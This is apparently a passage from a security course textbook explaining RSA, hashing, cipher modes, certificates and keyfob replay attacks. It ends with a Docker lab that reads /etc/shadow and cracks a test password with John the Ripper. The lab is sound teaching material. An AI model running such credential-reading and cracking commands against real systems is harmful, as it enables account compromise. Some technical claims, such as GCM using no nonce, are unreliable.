For example it is much easier for a computer to multiply large numbers than to determine the factors of large numbers.
This is the foundation of the RSA algorithm.
<a href="https://www.cs.drexel.edu/~jpopyack/IntroCS/HW/RSAWorksheet.html">A simplified version of the algorithm</a> is shown below:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-text" data-lang="text">KEY GENERATION
p = a random prime number
q = a random prime number
N = p * q
r = (p - 1) * (q - 1)
K = a number which equals one when modded by r and can be factored
e = a factor of K that doesn't share factors with N
d = another factor of K that doesn't share factors with N
Your public key is N and e
Your private key is N and d

ENCRYPTION
ciphertext = (cleartext**e)%N

DECRYPTION
cleartext = (ciphertext**d)%N

EXAMPLE
p = 7
q = 13
N = 7 * 13 = 91
r = 72
K = 145 (because 145%72 = 1)
e = 5
d = 29
Public Key = 91, 5
Private Key = 91, 29
cleartext = 72 ('H' in ASCII)
ciphertext = (72**5)%91 = 11 (encrypted using N and e)
cleartext = (11**29)%91 = 72 (decrypted using N and d)</code></pre>
</div>
</div>
<div class="paragraph">
<p>In order to <em>crack</em> RSA you would need to be able to factor N into it&#8217;s two prime numbers.
While it is trivial in our simple example, imagine how difficult it would be for to <a href="https://stackoverflow.com/questions/11832022/why-are-large-prime-numbers-used-in-rsa-encryption">factor a number with 1400 decimal digits</a> the current recommended keysize for RSA.
You&#8217;ll notice that the algorithm only requires exponentiation, multiplication, and modulus arithmetic.
At no point do you ever have to factor a large prime number to generate keys, encrypt, or decrypt.
You only have to perform that operation if you&#8217;re trying to work backwards without the keys.</p>
</div>
<div class="paragraph">
<p>Other similar one-way function exist based on elliptical curves.
It turns out that motion along an elliptical curve can be described according to a start and end point and several iterations of a simple algorithm.
You can reconstruct the initial conditions if you know the start point, end point, and how many iterations it took.
If all you know is the start and end point you can&#8217;t determine the initial conditions.</p>
</div>
</div>
<div class="sect2">
<h3 id="_hashes">2.5. Hashes</h3>
<div class="imageblock right">
<div class="content">
<img src="images/hash.svg" alt="hash" width="300" height="144">
</div>
</div>
<div class="paragraph">
<p>A hashing algorithm is a one-way function that creates hashed text from plaintext.
It is often used for data validation as a relatively small hash <em>digest</em> or <em>signature</em> can demonstrate the integrity of a large block of data.
Hashes can also be used so that sensitive information does not have to be stored in cleartext.
By storing a hash of a password, you can check to see if the correct password was entered without storing the password itself.
In the case of a data breach only the hashes are leaked and the attacker does not have access to the passwords to try with other services.</p>
</div>
<div class="paragraph">
<p>Two main families of hash algorithms are used: MD5 and SHA.
MD5 produces a 128-bit hash value and is still often used to verify data integrity.
The algorithm is technically cryptographically broken, but you may still see it in use.
The SHA family of algorithms consists of SHA-1, SHA-2, and SHA-3:</p>
</div>
<div class="ulist">
<ul>
<li>
<p>SHA-1: 160 bits, similar to MD5, designed by the NSA, no longer approved for cryptographic use</p>
</li>
<li>
<p>SHA-2: SHA-256 and SHA-512, very common with the number indicating the block size, designed by the NSA</p>
</li>
<li>
<p>SHA-3: non-NSA designed, not widely adopted, similar numbering scheme as SHA-2 (SHA3-256, etc.)</p>
</li>
</ul>
</div>
<div class="paragraph">
<p>Dictionary based attacks against password hashes are fairly common.
Typically software is used which generates a hash for every word in the dictionary and then compares that hash to what is stored on the compromised machine.
One way to combat this is through salting or adding random bits to each password.
When salting the bits are stored with the hash.
This forces a dictionary based attack to actively generate the hashes based on what the salt is as opposed to using a stored table (rainbow table) of all the possible hashes.
It can make attacks go from instant to days or even years depending on the complexity of the password.</p>
</div>
<div class="paragraph">
<p>An even better way of combating attacks against hashes is through a secret salt or <em>pepper</em>.
A pepper is a random value that is added to the password but not stored with the resulting hash.
The random value can be stored in a separate medium such as a hardware Security Module.</p>
</div>
</div>
<div class="sect2">
<h3 id="_symmetric_encryption">2.6. Symmetric Encryption</h3>
<div class="imageblock left">
<div class="content">
<img src="images/symmetric.svg" alt="symmetric" width="550" height="144">
</div>
</div>
<div class="paragraph">
<p>Symmetric encryption is probably the simplest encryption to understand in that it only uses a single key (in this case our key is labelled 'A') to encrypt or decrypt data.
Both parties need to know the private key in order to communicate.
It does pose a security risk in that if the channel used for key exchange is insecure, all of the messages can be decrypted.
That being said, given that it is simpler than many other forms of encryption, it is often used for secure communication or storage.</p>
</div>
<div class="exampleblock">
<div class="title">Example 2. One-time-pad</div>
<div class="content">
<div class="paragraph">
<p>One-time-pad (OTP) is a rare example of a pen and paper, symmetric encryption scheme that cannot be cracked.
The difficulty in OTP mirrors the difficulty with all symmetric encryption, namely that pre-shared keys need to be exchanged at some point.</p>
</div>
<div class="paragraph">
<p>Imagine that a prisoner wishes to send encrypted messages to someone outside the prison.
To do so, they will make use of a copy of Harry Potter and the Sorcerer&#8217;s Stone that they have in their cell.
The message they want to send is "DIG UP THE GOLD".
They turn to "Chapter One: The Boy Who Lived" and look up the first twelve letters in the chapter: MR AND MRS DURS.
For each letter of their message, they convert it to its number in the alphabet: 4 9 7 21 16 20 8 5 7 15 12 4 (DIG UP THE GOLD).
They do the same for the key they looked up in their book: 13 18 1 14 4 13 18 19 4 21 18 19 (MR AND MRS DURS).
Finally they add the two numbers to get their ciphertext: 17 27 8 35 20 33 26 24 11 36 30 23.</p>
</div>
<div class="paragraph">
<p>If the prisoner sends that ciphertext to someone on the outside who knows that they key is the first chapter of Harry Potter and the Sorcerer&#8217;s Stone, they will be able to subtract the key from each of the numbers in the ciphertext and discover the plaintext message.
While theoretically unbreakable, anybody else who has the key can recover the text as well.
This means that using common keys like popular books make it trivial for a man-in-the-middle to decode the ciphertext.
After all, the warden probably knows every book that the prisoner has in their cell.</p>
</div>
<div class="paragraph">
<p>OTP has been used by spy agencies, often for communications between individuals via dead-drops.
In this situation tables of random characters printed in duplicate are exchanged as the key.</p>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_asymmetric_encryption">2.7. Asymmetric Encryption</h3>
<div class="imageblock">
<div class="content">
<img src="images/asymmetric.svg" alt="asymmetric" width="700" height="144">
</div>
</div>
<div class="paragraph">
<p>An asymmetric encryption algorithm has actually already been demonstrated in the <a href="#_mathematical_foundation">Mathematical Foundation</a> section.
Asymmetric encryption has a public key which can be published anywhere and used to encrypt messages that only the holder of the private key, which is not published, can unencrypt.
For example if you want to receive encrypted emails you may make your <a href="https://gnupg.org/">GNU Privacy Guard (GPG)</a> public key available a <a href="https://keyserver.ubuntu.com/">public key server</a>.
This would allow anyone to look up your public key, encrypt a message that only you can read, and send you the ciphertext.
Asymmetric encryption gets around the difficulties of key exchange via an untrusted channel (like email).
Unfortunately the cost of such a useful system is that asymmetric algorithms tend to be much slower that their symmetric counterparts.</p>
</div>
</div>
<div class="sect2">
<h3 id="_stream_ciphers">2.8. Stream Ciphers</h3>
<div class="paragraph">
<p>Stream ciphers encode data one symbol at a time and produces one ciphertext symbol for each cleartext symbol.
Given that you can often use some sort of block encryption with a significantly small block size, stream encryption is not used as often.
Technically the OTP example, when used one symbol at a time, is a stream cipher.
The keys come in one symbol at a time, the cleartext comes in one symbol at a time, and an operation is performed (addition in the case of the example) to create the ciphertext.
Given a suitable keysize and a well-researched algorithm, stream ciphers can be just as secure as block ciphers.
That being said a stream cipher is usually more consistent in its runtime characteristics and typically consumes less memory
Unfortunately there are not as many well-researched algorithms and widely used stream ciphers.</p>
</div>
</div>
<div class="sect2">
<h3 id="_block_ciphers">2.9. Block Ciphers</h3>
<div class="paragraph">
<p>Block ciphers takes the data in, in blocks and use cipher blocks of the same size to perform the encryption.
It is very popular and there are many secure algorithms to choose from.
Unfortunately if the input data doesn&#8217;t fit neatly into blocks of the same size, padding may be required, which takes up more space/memory and reduces the speed of the cipher.
As such the block encryption is often less performant than stream encryption.</p>
</div>
<div class="sect3">
<h4 id="_block_cipher_modes_of_operation">2.9.1. Block Cipher Modes of Operation</h4>
<div class="paragraph">
<p>There are several ways you can create your cipher blocks and depending on how you do it, various attacks are possible:</p>
</div>
<div class="sect4">
<h5 id="_electronic_codebook_ecb">Electronic Codebook (ECB)</h5>
<div class="openblock float-group">
<div class="content">
<div class="imageblock right">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/w/index.php?curid=26434116"><img src="images/ecb.svg" alt="ecb" width="600"></a>
</div>
</div>
<div class="paragraph">
<p>The simplest mode of operation, data is divided into blocks and each block is encoded using a key.
Since the blocks are encoded the same way, identical blocks will give identical ciphertexts.
This makes it easier, given enough data, to determine what the key is.</p>
</div>
</div>
</div>
</div>
<div class="sect4">
<h5 id="_cipher_block_chaining_cbc">Cipher block chaining (CBC)</h5>
<div class="openblock float-group">
<div class="content">
<div class="imageblock left">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/w/index.php?curid=26434096"><img src="images/cbc.svg" alt="cbc" width="600"></a>
</div>
</div>
<div class="paragraph">
<p>Starting with an initialization vector (IV) each block is XORed with part of the ciphertext of the previous block to create a chain of ciphertext that is constantly changing.
This means that identical blocks will result in <em>different</em> ciphertexts.
This is the most common mode of operation, its weaknesses being that the algorithm cannot be run in parallel (sorry modern processors) and that the IV is a common attack target.</p>
</div>
</div>
</div>
</div>
<div class="sect4">
<h5 id="_counter_ctr">Counter (CTR)</h5>
<div class="openblock float-group">
<div class="content">
<div class="imageblock right">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/w/index.php?curid=26434109"><img src="images/ctr.svg" alt="ctr" width="600"></a>
</div>
</div>
<div class="paragraph">
<p>Instead of using an IV, CTR uses a nonce (random number that is the same for all blocks) and counter.
The counter is incremented with each block, meaning this mode can function in parallel.
CTR mode solves the problems of ECB while still providing an algorithm that can run quickly on modern machines.</p>
</div>
</div>
</div>
</div>
<div class="sect4">
<h5 id="_galoiscounter_mode_gcm">Galois/Counter Mode (GCM)</h5>
<div class="openblock float-group">
<div class="content">
<div class="imageblock left">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/w/index.php?curid=74845777"><img src="images/gcm.svg" alt="gcm" width="400"></a>
</div>
</div>
<div class="paragraph">
<p>GCM uses a counter like CTR, but does not make use of a nonce.
Instead an IV is used with the inititial counter.
GCM also generates a message authentication code (MAC) for each block to verify the integrity of the block.
This combination makes for a modern, robust algorithm that is gaining rapid adoption.</p>
</div>
</div>
</div>
<div class="sidebarblock">
<div class="content">
<div class="title">Case Study: Exploiting Non-Rolling Codes</div>
<div class="paragraph">
<p>The importance of non-repeating codes, such as the counter codes used in the CTR and GCM block cipher modes of operation can be highlighted through analysis of another important technology that uses codes: keyless entry systems.
When garage door openers first came on to the market, the remote would broadcast a single code that the receiver was programmed to recognize as correct.
This meant that anyone listening in could easily get the code and replay the code to open the garage door with their own device.<sup class="footnote">[<a id="_footnoteref_1" class="footnote" href="#_footnotedef_1" title="View footnote.">1</a>]</sup> To combat this, companies began using <a href="https://en.wikipedia.org/wiki/Rolling_code">rolling codes</a> in their remotes and receivers. Given the same seed a rolling code allows each device to generate a sequence of codes that are exactly the same. The remote will use the next code in a sequence every time the button is hit. The receiver will validate the recieved code if it matches any of the next several codes in the sequence (in case the button was hit a few times out of range). This effectively mitigates the replay attack.</p>
</div>
<div class="paragraph">
<p>Given that this was implemented in the 1980s with garage door remotes, you would assume car manufacturers employ the same technology in their remotes.
In a case of "everything old is new again" this isn&#8217;t true.
<a href="https://github.com/HackingIntoYourHeart/Unoriginal-Rice-Patty/blob/main/README.md">Blake Berry (HackingIntoYourHeart) discovered that several makes and models of cars are actually still vulnerable to a replay attack.</a></p>
</div>
<div class="paragraph">
<p>Sammy Kamkar also discovered a vulnerablility for rolling codes, named RollJam, which he demonstrated at DEF CON 23.
Kamkar&#8217;s device jams signals sent by a keyfob, while recording the codes being sent.
Once it has two codes recorded, presumably from the victim pressing the button multiple times, it stops jamming, sends out the first code to unlock the car and stores the second code to unlock the car at a later time.</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_encryption_examples">2.10. Encryption Examples</h3>
<div class="sect3">
<h4 id="_rsa">2.10.1. RSA</h4>
<div class="paragraph">
<p>RSA is an asymmetric encryption standard developed in 1977 that is still very popular.
Its trapdoor function is based on the difficulty of factoring large numbers.
The name RSA comes from the names of the authors of the system: Ron Rivest, Adi Shamir, and Leonard Adleman.</p>
</div>
</div>
<div class="sect3">
<h4 id="_advanced_encryption_standard_aes">2.10.2. Advanced Encryption Standard (AES)</h4>
<div class="paragraph">
<p>AES is a symmetric block cipher developed in 1998 to supersede the less secure Data Encryption Standard (DES).
AES works on 128 bit blocks of data, performing multiple rounds of substitution-permutation to encrypt data.
You will find AES used to encrypt network traffic (as is the case in a virtual private network), data stored to disk (disk encryption), or computer game data that is saved to storage.
AES is a <em>very</em> common cipher.</p>
</div>
</div>
<div class="sect3">
<h4 id="_elliptic_curve_cryptography_ecc">2.10.3. Elliptic-curve Cryptography (ECC)</h4>
<div class="paragraph">
<p>ECC is an asymmetric encryption scheme that is quite fast and easy to computer.
It is rapidly becoming the go to choice for digital signatures and key exchanges, gaining adopting starting in 2004.
ECC is based on the geometry of a pre-determined set of curves (some examples can be found <a href="http://www.secg.org/sec2-v2.pdf">here</a>), which can be used to create a trapdoor function.</p>
</div>
</div>
<div class="sect3">
<h4 id="_diffie_hellman_key_exchange">2.10.4. Diffie-Hellman Key Exchange</h4>
<div class="openblock float-group">
<div class="content">
<div class="imageblock right">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/w/index.php?curid=17063048"><img src="images/dh.svg" alt="dh" width="300"></a>
</div>
</div>
<div class="paragraph">
<p>Given the slow nature of asymmetric algorithms, often an application such as a VPN will choose to use asymmetric cryptography to exchange a shared secret key and then use that secret key with a faster symmetric algorithm such as AES.
Diffie-Hellman does exactly that and was first published in 1976.
Diffie-Hellman key exchange uses the same mathematical concepts as RSA, exponentiation and modulus arithmetic, to great effect, but to visualize what is happening a metaphor of secret color mixing is used (see the included diagram).
It is important to remember that because the medium of exchange may be slow a DH key exchange is designed to generate minimal traffic.</p>
</div>
</div>
</div>
</div>
<div class="sect3">
<h4 id="_digital_certificates">2.10.5. Digital Certificates</h4>
<div class="paragraph">
<p>A digital certificate is a set of credentials used to identify a company or an individual.
Since asymmetric encryption requires know a party&#8217;s public key, a digital certificate includes that key as well as an ID of the owner.
The question then becomes how do you trust that the public key is <em>actually</em> for the alleged owner?
That&#8217;s where the issuing authority comes in.
A <em>certificate authority (CA)</em> signs the certificate indicating that the ID and public_key are correct.
Certificates can be self-signed, but this sidesteps the trust placed in the CA and is often only used in testing.
Since most certificates are used for encrypting web traffic, Web browsers will typically warn you if a site is using a self-signed certificate.</p>
</div>
<div class="paragraph">
<p>Given how how many certificates need to be issued and the work that needs to be done to verify them, most certs are not issues by root CAs, but are actually issued by intermediate CAs.
Root CAs delegate the work to Intermediate CAs and indicate their trust in them by signing the intermediate CAs keys.
This creates a <em>chain of trust</em> from the issued certificate (signed by the Intermediate CA) to the Intermediate CA (signed by the root CA) to the root CA (trusted by the browser).
Tools that use this chain of trust will keep the root CA certificates and update them from the companies that issue them as needed.</p>
</div>
<div class="paragraph">
<p>The certificate store is very important and while users rarely interact with it is often possible to install root CAs manually.
<a href="https://docs.telerik.com/fiddler/configure-fiddler/tasks/trustfiddlerrootcert">This is can be used to create a proxy that can decrypt HTTPS traffic for debugging</a> or for more nefarious purposes.
For this reason some applications, Facebook mobiles apps for example, maintain their own certificate store and prevent users from adding root CAs to it.</p>
</div>
<div class="imageblock left">
<div class="content">
<img src="images/letsencrypt.svg" alt="letsencrypt" width="200">
</div>
</div>
<div class="paragraph">
<p>So how do you get a certificate for your website?
The customer will generate a Certificate Signing Request (CSR) that includes the public key and their ID.
The CA will validate that the customer owns the website and build and sign the cert.
This who process can be automated and performed for free via a  tool called <a href="https://letsencrypt.org/">Let&#8217;s Encrypt</a>.</p>
</div>
</div>
<div class="sect3">
<h4 id="_blockchain">2.10.6. Blockchain</h4>
<div class="imageblock right">
<div class="content">
<a class="image" href="https://commons.wikimedia.org/w/index.php?curid=68638112"><img src="images/btc.svg" alt="btc" width="150"></a>
</div>
</div>
<div class="paragraph">
<p>It is hard to talk about cryptography without addressing blockchains, one of the concepts behind cryptocurrencies.
A blockchain is a shared ledger (of transactions in the case of BitCoin) where blocks are constantly being added to add to the information being stored.
Periodically an new block is created, which includes a hash of the previous block and a hash of itself for the next block to reference.
By examining these hashes, you can prove the integrity each block and its position, thus making a publicly-available, mutually agreed upon accounting of what has occurred on the network.
Typically to prevent bad actors from adding block some sort of proof of work, a mathematically difficult operation, or proof of stake, an accounting of investment in the network, must be included when adding a block to the chain.</p>
</div>
</div>
<div class="sect3">
<h4 id="_trusted_platform_module_tpm_hardware_security_module_hsm">2.10.7. Trusted Platform Module (TPM) / Hardware Security Module (HSM)</h4>
<div class="paragraph">
<p>These modules provide hardware specifically for use with encryption.
HSMs are removable modules while TPMs are motherboard chips.
Many ciphers rely on a reliable source of entropy (randomness) which these modules provide.
They can also significantly increase the speed at which cryptographic algorithms run by moving the operations to specialized hardware.
Lastly, these modules can be used to store keys <em>and</em> make them only accessible via the module.
This can add an extra layer of security to prevent the keys from being easily copied.</p>
</div>
</div>
<div class="sect3">
<h4 id="_steganography">2.10.8. Steganography</h4>
<div class="paragraph">
<p>Steganography is the process of hiding data in something such that to a casual observer it cannot be detected.
Data can be hidden in audio, images, or even <a href="https://dl.packetstormsecurity.net/crypt/snow/description.html">plain text!</a>.
The hidden data can also be encrypted if an additional layer of security is required.
In the field of security, malicious code may be hidden inside other files using steganographic techniques.
This makes it more difficult for tools to find them when searching storage.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_review_2">2.11. Review</h3>
<div class="sect3">
<h4 id="_labs_2">2.11.1. Labs</h4>
<div class="openblock lab">
<div class="title">Hash it Out</div>
<div class="content">
<div class="paragraph">
<p>A <em>hash</em> is a one-way cryptographic function that produces a <em>unique</em> set of characters for a given <em>message</em>.
In a perfect world, given a hash you should <em>not</em> be able to determine what the original message was, but given a hash and the original message you can check that the hash matches the message.
Before we dive into the uses of a hash, lets try to further understand it by looking at a simple and consequently poor hashing algorithm.<sup class="footnote">[<a id="_footnoteref_2" class="footnote" href="#_footnotedef_2" title="View footnote.">2</a>]</sup></p>
</div>
<div class="paragraph">
<p><strong>Anagram Hash</strong></p>
</div>
<div class="paragraph">
<p>Let&#8217;s assume we wanted to hash the message "Hello from Karl" so that we can have a string of characters the uniquely represent that phrase.
One way to do it would be to strip all the punctuation in the message, make everything lowercase, and then arrange all the letters alphabetically.
"Hello from Karl" becomes "aefhklllmoorr".
You can think of it like saying, "There is one 'a' in the message, one 'e' in the message, one 'f' in the message', one 'k' in the message, three 'l&#8217;s in the message&#8230;&#8203;"
Now our hash, "aefhklllmoorr", can be used to uniquely identify the phrase.</p>
</div>
<div class="paragraph">
<p>Now assume Karl wants to send us a message but he can&#8217;t trust the person sending the message.
He could use the untrusted party to send us the message and then put the hash someplace public like on a website.
We could use the hash to know the message came from Karl <em>and</em> if anyone else got the hash they would not be able to discern the message because a hash is a one-way function.
"aefhklllmoorr" reveals very little about the message, but it can be used to check its accuracy.</p>
</div>
<div class="paragraph">
<p>Hopefully this is beginning to show the power of hashes.
Now lets examine another very common usecase and find out exactly why this is a terrible algorithm.</p>
</div>
<div class="paragraph">
<p>Assume you run a website where a user uses a password to log in.
You want to make sure users are using their password when they log in, but you do not want to store the password on your website.
This is quite common.
If you website was breached you don&#8217;t want to leak a bunch of people&#8217;s passwords.
What do you do?
What you could do is store a hash of their password, hash the password when they try to login, and compare the hashes.
For example if our password was "password" using our basic hash algorithm the hash would be "adoprssw".
We could store "adoprssw" in our database, use it for comparison during login, and if someone were to ever steal the data in our database they wouldn&#8217;t know that the original password is "password".
This may prevent an attacker from exploiting the fact that many people use the same password on multiple sites.</p>
</div>
<div class="paragraph">
<p>The problem is that there are many things that hash to "adoprssw" including "wordpass", "drowsaps", or even the hash we&#8217;re storing: "adoprssw".
When multiple messages have the same hash it is referred to as a <em>collision</em> and this particular algorithm is useless because it generates so many of them.</p>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>What would the anagram hash of "AlwaysDancing" be?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Now that we understand what hashes do and to some extant how they are possible, lets look at a much more useful hash function.</p>
</div>
<div class="paragraph">
<p><strong>MD5</strong></p>
</div>
<div class="paragraph">
<p>For this section, we are going to be using Docker and a terminal.
<a href="https://docs.docker.com/get-docker/">Please follow these directions for installing Docker.</a>
For Windows you can use the <a href="https://www.microsoft.com/en-us/p/windows-terminal/9n0dx20hk701">Windows Terminal app</a> and in MacOS you can use the preinstalled Terminal app.
Gray boxes show the commands as typed into the terminal with typical output where possible.
Your prompt (the part shown before the command) may differ depending on your OS.</p>
</div>
<div class="paragraph">
<p>Start by running a BASH shell on an Ubuntu Linux container:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">ryan@R90VJ3MK:/windir/c/Users/rxt1077/it230/docs$ docker run -it ubuntu bash <i class="conum" data-value="1"></i><b>(1)</b>
root@8e0962021f85:/<i class="conum" data-value="2"></i><b>(2)</b></code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Here we are using the Docker run command to interactively (-it) run bash on Ubuntu</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>Notice the new prompt showing that we are root on this container</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>MD5 is a message-digest algorithm that produces significantly better hashes than our Anagram algorithm.
Most Linux distributions include a simple utility for creating an MD5 hash based on a file&#8217;s contents.
This command is named md5sum.
Typically this is used to detect if a file has been tampered with.
A website may provide links to download software as well as an MD5 hash of the files so that you know what you&#8217;ve downloaded is correct.
Similarly a security system may keep md5sums (MD5 hashes) of certain critical files to determine if they have been tampered with by malware.
Let&#8217;s practice taking the md5sum of the <code>/etc/passwd</code> file:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@8e0962021f85:/# md5sum /etc/passwd
9911b793a6ca29ad14ab9cb40671c5d7  /etc/passwd <i class="conum" data-value="1"></i><b>(1)</b></code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>The first part of this line is the MD5 hash, the second part is the file name</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Now we&#8217;ll make a file with <em>your</em> first name in it and store it in /tmp/name.txt:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@8e0962021f85:/# echo "&lt;your_name&gt;" &gt;&gt; /tmp/name.txt <i class="conum" data-value="1"></i><b>(1)</b></code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>Substitute your actual first name for &lt;your_name&gt;</td>
</tr>
</table>
</div>
<div class="admonitionblock important deliverable">
<table>
<tr>
<td class="icon">
<i class="fa icon-important" title="Important"></i>
</td>
<td class="content">
<div class="paragraph">
<p>What is the md5sum of <code>/tmp/name.txt</code>?</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>For our final activity, lets take a look at some of the weaknesses of hashes.</p>
</div>
<div class="paragraph">
<p><strong>Hash Cracking</strong></p>
</div>
<div class="paragraph">
<p>Passwords in a Linux system are hashed and stored in the <code>/etc/shadow</code> file.
Let&#8217;s create a user, give them a simple password, and print out the contents of that file to see how it looks:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@8e0962021f85:/# useradd karl
root@8e0962021f85:/# passwd karl
New password: <i class="conum" data-value="1"></i><b>(1)</b>
Retype new password: <i class="conum" data-value="2"></i><b>(2)</b>
passwd: password updated successfully
root@8e0962021f85:/# cat /etc/shadow
root:*:18866:0:99999:7:::
daemon:*:18866:0:99999:7:::
bin:*:18866:0:99999:7:::
sys:*:18866:0:99999:7:::
sync:*:18866:0:99999:7:::
games:*:18866:0:99999:7:::
man:*:18866:0:99999:7:::
lp:*:18866:0:99999:7:::
mail:*:18866:0:99999:7:::
news:*:18866:0:99999:7:::
uucp:*:18866:0:99999:7:::
proxy:*:18866:0:99999:7:::
www-data:*:18866:0:99999:7:::
backup:*:18866:0:99999:7:::
list:*:18866:0:99999:7:::
irc:*:18866:0:99999:7:::
gnats:*:18866:0:99999:7:::
nobody:*:18866:0:99999:7:::
_apt:*:18866:0:99999:7:::
karl:$6$A52NvzxmRoUpGksY$b8yzhXN1B4HM5ULw.QTSVB2s8yJuuC1XTtu7i8fopIy/kbIOmhB2LZ8O2oD5KdBTo1vZic00RYAupPRiqyC1d.:18871:0:99999:7::: <i class="conum" data-value="3"></i><b>(3)</b></code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>At this prompt type <code>test</code>, it will <em>not</em> be echoed to the screen</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>At this prompt retype <code>test</code></td>
</tr>
<tr>
<td><i class="conum" data-value="3"></i><b>3</b></td>
<td>As you can see here the <code>karl</code> user has a long hash immediately after their username</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>One of the problems with hashes are that if people choose simple passwords, like <code>test</code>, they can be easily cracked by a program that takes a wordlist of common passwords, generates their hashes, and then checks to see if the hash is the same.
While a hash may be a one-way function, it is still subject to this type of attack.
We&#8217;re going to install a program called <a href="https://www.openwall.com/john/">John the Ripper</a> on our container and do exactly that:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@8e0962021f85:/# apt-get update <i class="conum" data-value="1"></i><b>(1)</b>
Get:1 http://security.ubuntu.com/ubuntu focal-security InRelease [114 kB]
Get:2 http://archive.ubuntu.com/ubuntu focal InRelease [265 kB]
Get:3 http://security.ubuntu.com/ubuntu focal-security/restricted amd64 Packages [488 kB]
Get:4 http://security.ubuntu.com/ubuntu focal-security/multiverse amd64 Packages [30.1 kB]
Get:5 http://security.ubuntu.com/ubuntu focal-security/main amd64 Packages [1037 kB]
Get:6 http://archive.ubuntu.com/ubuntu focal-updates InRelease [114 kB]
Get:7 http://archive.ubuntu.com/ubuntu focal-backports InRelease [101 kB]
Get:8 http://security.ubuntu.com/ubuntu focal-security/universe amd64 Packages [790 kB]
Get:9 http://archive.ubuntu.com/ubuntu focal/restricted amd64 Packages [33.4 kB]
Get:10 http://archive.ubuntu.com/ubuntu focal/universe amd64 Packages [11.3 MB]
Get:11 http://archive.ubuntu.com/ubuntu focal/multiverse amd64 Packages [177 kB]
Get:12 http://archive.ubuntu.com/ubuntu focal/main amd64 Packages [1275 kB]
Get:13 http://archive.ubuntu.com/ubuntu focal-updates/main amd64 Packages [1479 kB]
Get:14 http://archive.ubuntu.com/ubuntu focal-updates/restricted amd64 Packages [535 kB]
Get:15 http://archive.ubuntu.com/ubuntu focal-updates/multiverse amd64 Packages [33.4 kB]
Get:16 http://archive.ubuntu.com/ubuntu focal-updates/universe amd64 Packages [1068 kB]
Get:17 http://archive.ubuntu.com/ubuntu focal-backports/universe amd64 Packages [6324 B]
Get:18 http://archive.ubuntu.com/ubuntu focal-backports/main amd64 Packages [2668 B]
Fetched 18.9 MB in 22s (869 kB/s)
Reading package lists... Done
root@8e0962021f85:/# apt-get install john <i class="conum" data-value="2"></i><b>(2)</b>
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following additional packages will be installed:
  john-data
Suggested packages:
  wordlist
The following NEW packages will be installed:
  john john-data
0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.
Need to get 4466 kB of archives.
After this operation, 7875 kB of additional disk space will be used.
Do you want to continue? [Y/n] y <i class="conum" data-value="3"></i><b>(3)</b>
Get:1 http://archive.ubuntu.com/ubuntu focal/main amd64 john-data all 1.8.0-2build1 [4276 kB]
Get:2 http://archive.ubuntu.com/ubuntu focal/main amd64 john amd64 1.8.0-2build1 [189 kB]
Fetched 4466 kB in 7s (683 kB/s)
debconf: delaying package configuration, since apt-utils is not installed
Selecting previously unselected package john-data.
(Reading database ... 4127 files and directories currently installed.)
Preparing to unpack .../john-data_1.8.0-2build1_all.deb ...
Unpacking john-data (1.8.0-2build1) ...
Selecting previously unselected package john.
Preparing to unpack .../john_1.8.0-2build1_amd64.deb ...
Unpacking john (1.8.0-2build1) ...
Setting up john-data (1.8.0-2build1) ...
Setting up john (1.8.0-2build1) ...</code></pre>
</div>
</div>
<div class="colist arabic">
<table>
<tr>
<td><i class="conum" data-value="1"></i><b>1</b></td>
<td>We start by updating the available package list</td>
</tr>
<tr>
<td><i class="conum" data-value="2"></i><b>2</b></td>
<td>We then install the program</td>
</tr>
<tr>
<td><i class="conum" data-value="3"></i><b>3</b></td>
<td>You must interactively press <code>Y</code> here to continue the installation</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Now that we have John the Ripper installed, we can use the default wordlist to try and determine what the password is that matches karl&#8217;s hash in <code>/etc/shadow</code>:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="language-console" data-lang="console">root@8e0962021f85:/# john --wordlist=/usr/share/john/password.lst /etc/shadow
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
test             (karl)
1g 0:00:00:01 100% 0.6211g/s 178.8p/s 178.8c/s 178.8C/s lacrosse..pumpkin
Use the "--show" option to display all of the cracked passwords reliably
Session completed</code></pre>
</div>
</div>
<div class="paragraph">
<p>Given that <code>test</code> is in the included common password wordlist, <code>/usr/share/john/password.lst</code>, you will quickly find that John the Ripper figures out that karl&#8217;s password is <code>test</code>.
